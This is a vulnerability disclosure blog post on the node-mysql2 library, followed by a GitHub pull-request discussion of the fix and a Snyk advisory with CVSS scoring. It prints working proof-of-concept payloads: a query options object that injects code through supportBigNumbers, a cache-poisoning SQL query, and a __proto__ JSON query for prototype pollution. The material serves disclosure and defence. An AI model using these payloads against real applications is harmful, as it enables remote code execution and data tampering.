# MySQL2: Dangers of User-Defined Database Connections

Posted on Mar 26, 2024
> The article is informative and intended for security specialists conducting testing within the scope of a contract. The author is not responsible for any damage caused by the application of the provided information. The distribution of malicious programs, disruption of system operation, and violation of the confidentiality of correspondence are pursued by law.

# Introduction

The node-mysql2 library is one of the most popular libraries for connecting to a database in JavaScript, with over 2 million installations per week.

At the end of last year, I encountered an automation system that utilized the node-mysql2 library to connect to user databases and execute queries controlled by them.
In this article, I want to discuss the issues it causes and provide you with their solutions.

# Basics

In the application I was researching, the user could establish a connection to their database and execute queries with it:

```
// Simplified example
const mysql = require('mysql2');
...
const connection = mysql.createConnection({
    host: userdata.host,
    user: userdata.user,
    database: userdata.db,
    password: userdata.password,
});
...
connection.query(userdata.query,reponseFunction)
);

```

Obviously, in this case, we cannot talk about standard SQL-related attack vectors since the connection belongs to us. Therefore, we should consider issues related to affecting other users data or server performance.

# RCE

As you might guess, I was able to find a way to execute arbitary code in such a configuration, but how is this possible?

First, let’s understand how the library works. In most cases, the first argument passed to the connection.query function is a string containing the query:

```
connection.query("SELECT 1;",reponseFunction)

```

But actually, the first argument can also be an object, where in addition to the query itself, we can pass parameters for its processing:

```
connection.query({sql:"SELECT 1;", ... },reponseFunction)

```

After that, the passed configuration parameters will be used by the response parsing [function](https://github.com/sidorares/node-mysql2/blob/1609b5393516d72a4ae47196837317fbe75e0c13/lib/parsers/text_parser.js#L14C10-L14C21).
(It’s also worth noting that these same parameters can be passed directly into the database connection, which can be useful if the query argument is filtered.)

If you look closely, you will notice that this function involves code generation. MySQL2 generates a parsing function for each query, which is then cached for optimization purposes. This is important for understanding this article.

I noticed that in most cases, it successfully sanitizes the data that enters the generated code. However, there is also a line:

```
      return `packet.parseLengthCodedInt(${supportBigNumbers})`;

```

The parameter supportBigNumbers is a number in a legitimate case, so it is not sanitized. However, are there any checks for this?

A quick look at the code revealed that such checks are absent. This piece of code will be executed if the executed query returns a BIGNUMBER, so to achieve RCE, it is sufficient to pass the following object as the first argument:

```
 {sql:`SELECT INDEX_LENGTH FROM information_schema.tables LIMIT 1`, supportBigNumbers:"console.log(1337)"}

```

As a result, you will see 1337 in the console after executing this database query.

**!!! It’s also important to understand that an object with a global prototype is used as a map. Therefore, you can use this as Prototype Pollution to achieve RCE. If the targeted application uses mysql2 and you achieve PP, you can also gain RCE.**

# Cache Poisoning

The next vulnerability becomes accessible even in stricter application configurations. Its exploitation is possible even if the first argument query is checked to ensure it is a string.
As I mentioned earlier, the library utilizes caching of generated response functions. Let’s take a look at how it was [implemented](https://github.com/sidorares/node-mysql2/blob/fd3d117da82cc5c5fa5a3701d7b33ca77691bc61/lib/parsers/parser_cache.js#L9):

```
function keyFromFields(type, fields, options, config) {
  let res =
    `${type}` +
    `/${typeof options.nestTables}` +
    `/${options.nestTables}` +
    `/${options.rowsAsArray}` +
    `/${options.supportBigNumbers || config.supportBigNumbers}` +
    `/${options.bigNumberStrings || config.bigNumberStrings}` +
    `/${typeof options.typeCast}` +
    `/${options.timezone || config.timezone}` +
    `/${options.decimalNumbers}` +
    `/${options.dateStrings}`;
  for (let i = 0; i < fields.length; ++i) {
    const field = fields[i];
    res += `/${field.name}:${field.columnType}:${field.length}:${field.schema}:${field.table}:${field.flags}:${field.characterSet}`;
  }
  return res;
}

```

As you can see, keys are inserted into the string, and “:” is used as a delimiter. This is a poor implementation because the values passed into the key can also contain “:”. By exploiting this characteristic, one can manipulate the hashed function:

```
  connection.query(
    'SELECT information_schema.tables.TABLE_NAME,`tables:160:63/DATA_LENGTH:8:undefined::tables`.TABLE_ROWS FROM information_schema.tables INNER JOIN information_schema.tables AS `tables:160:63/DATA_LENGTH:8:undefined::tables` ON `tables:160:63/DATA_LENGTH:8:undefined::tables`.TABLE_ROWS!=information_schema.tables.TABLE_ROWS LIMIT 1;',
    function(err, results, fields) {
    }
  );
  // Send another request and spwan new connection
  connection1.query(
    `SELECT TABLE_NAME, TABLE_ROWS, DATA_LENGTH FROM information_schema.tables LIMIT 1;`,
    function(err, results, fields) {
      console.log(results);
      console.log(fields);
    }
  );

```

You will see output:

```
[ { TABLE_NAME: 'ADMINISTRABLE_ROLE_AUTHORIZATIONS', TABLE_ROWS: 0 } ]
[
  `TABLE_NAME` VARCHAR(64) NOT NULL,
  `TABLE_ROWS` BIGINT(21) UNSIGNED,
  `DATA_LENGTH` BIGINT(21) UNSIGNED
]

```

As evident, the fields of the second request include DATA\_LENGTH, which, however, is absent in the results. This discrepancy arises because the first request stores in the cache a key `text/undefined/undefined/false/false/false/boolean/local/false/false/TABLE_NAME:253:undefined:information_schema:tables:20609:224/TABLE_ROWS:8:undefined::tables:160:63/DATA_LENGTH:8:undefined::tables:160:63` with an incorrect packet parser.

This can be used to disrupt the logic of the application, sending data types that are not expected.

Fixed in latest release.

# Prototype Poisoning / Pollution

Returning to the process of generating the function that parses the returned response, it can be observed that an object with a global prototype is used as the user-supplied [value](https://github.com/sidorares/node-mysql2/blob/fd3d117da82cc5c5fa5a3701d7b33ca77691bc61/lib/parsers/text_parser.js#L134):

```
parserFn("const result = {};");

```

Therefore, if you pass the following query:

```
SELECT CAST('{"toString": {"toString":true}, "tags": {"a": 1, "b": null}}' as JSON) AS __proto__;

```

You will notice that the response prototype has changed

```
Object.getPrototypeOf(results[0])
> { tags: { a: 1, b: null }, toString: { toString: true } }

```

his only controls a specific prototype, not the global one. However, if we have the ability to control the configuration, we can simply pass `nestTables: true`:

```
    } else if (options.nestTables === true) {
        lvalue = `result[${helpers.srcEscape(fields[i].table)}][${fieldName}]`;
    }

```

As many might understand, this will give us full prototype pollution.

# Conclusion

I informed the vendor about these issues 90 days ago and my intentions to publish this material on March 26th. Unfortunately, the vendor did not provide the necessary cooperation, ignoring my emails for months, so this material was released without the final fixes.

Today, a [fix](https://github.com/sidorares/node-mysql2/releases/tag/v3.9.3) was released that addresses the cache manipulation issue. However, the remaining problems remain relevant in the latest version.

If you are using the library in the described scenarios, I strongly advise you to limit the connection parameters and the parameters passed in the query.

### @wellwelwel **[wellwelwel](/wellwelwel)** commented [Apr 9, 2024](#issue-2232659647) • edited Loading

Finishing the tasks started in [#2424](https://github.com/sidorares/node-mysql2/pull/2424) (and [#2572](https://github.com/sidorares/node-mysql2/pull/2572)).

This *PR* ensures a clean object evaluation for every item in results.

This is the final evaluation for both text and binary parsers:

```
const result = Object.create(null);

Object.defineProperty(result, 'constructor', {
  value: Object.create(null),
  writable: false,
  configurable: false,
  enumerable: false
});

// ...

// nestTables
if (!result[${tableName}]) result[${tableName}] = Object.create(null);
```
> I also tried a simple `Object.freeze(result.prototype)`, but the unit tests (specific to this) didn't pass as expected 🔓

---

### Note

These changes preserve security without affecting the end user:

```
const [results] = await connection.query('SELECT 1+1 AS `test`'); // or execute

results[0].test.toFixed(2); // '2.00' ✅
results[0].addCustomProp = true; // true ✅
```

Sorry, something went wrong.

| Hi,  Sorry for commenting on a closed PR, but it introduced a breaking changes for me. I use `node:assert/strict` library for assertion and it recognise the `constructor` own property of the "mysql object" as a new property. I construct the expected object as object literals, that does not contains the `null prototype constructor`  I created a reproduction repo <https://github.com/ert78gb/mysql2-object-creation>  I would like to know what is your opinion about this "breaking changes". Do you think `node:assert` library should change the comparison algorithm or you would like to modify the `mysql2` lib.  If you would like I could open a new issue.  Thx, Robi |

| Hm... 🤔  Hi [@ert78gb](https://github.com/ert78gb), I can't answer yet whether it's an unintentional *breaking change* for deep tests comparisons or if it can be fixed. I need to elaborate some tests.  Thanks for the basic repro, I'll start with that. |

## How to fix?

Upgrade `mysql2` to version 3.9.4 or higher.

## Overview

[mysql2](https://www.npmjs.com/package/mysql2) is a mostly API compatible with mysqljs and supports majority of features.

Affected versions of this package are vulnerable to Prototype Poisoning due to insecure `results` object creation and improper user input sanitization passed through `parserFn` in `text_parser.js` and `binary_parser.js`.

## PoC

```
SELECT CAST('{"toString": {"toString":true}, "tags": {"a": 1, "b": null}}' as JSON) AS __proto__;

```
```
Object.getPrototypeOf(results[0])
> { tags: { a: 1, b: null }, toString: { toString: true } }

```
## Details

Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values. Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.

There are two main ways in which the pollution of prototypes occurs:

* Unsafe `Object` recursive merge
* Property definition by path

### Unsafe Object recursive merge

The logic of a vulnerable recursive merge function follows the following high-level model:

```
merge (target, source)

foreach property of source

```
if property exists and is an object on both the target and the source

  merge(target[property], source[property])

else

  target[property] = source[property]

```

```

When the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.

Clone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.

`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.

### Property definition by path

There are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`

If the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.

## Types of attacks

There are a few methods by which Prototype Pollution can be manipulated:

| Type | Origin | Short description |
| --- | --- | --- |
| **Denial of service (DoS)** | Client | This is the most likely attack. DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`).  The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service. **For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |
| **Remote Code Execution** | Client | Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code. |
| **Property Injection** | Client | The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens. **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges. |

## Affected environments

The following environments are susceptible to a Prototype Pollution attack:

* Application server
* Web server
* Web browser
## How to prevent

1. Freeze the prototype— use `Object.freeze (Object.prototype)`.
2. Require schema validation of JSON input.
3. Avoid using unsafe recursive merge functions.
4. Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.
5. As a best practice use `Map` instead of `Object`.

### CVSS Scores

version 3.1
### Snyk

6.5 medium

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is no loss of confidentiality within the impacted component.

  **None**
* Integrity (I)

  Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is limited. The data modification does not have a direct, serious impact on the impacted component.

  **Low**
* Availability (A)

  Performance is reduced or there are interruptions in resource availability. Even if repeated exploitation of the vulnerability is possible, the attacker does not have the ability to completely deny service to legitimate users. The resources in the impacted component are either partially available all of the time, or fully available only some of the time, but overall there is no direct, serious consequence to the impacted component.

  **Low**
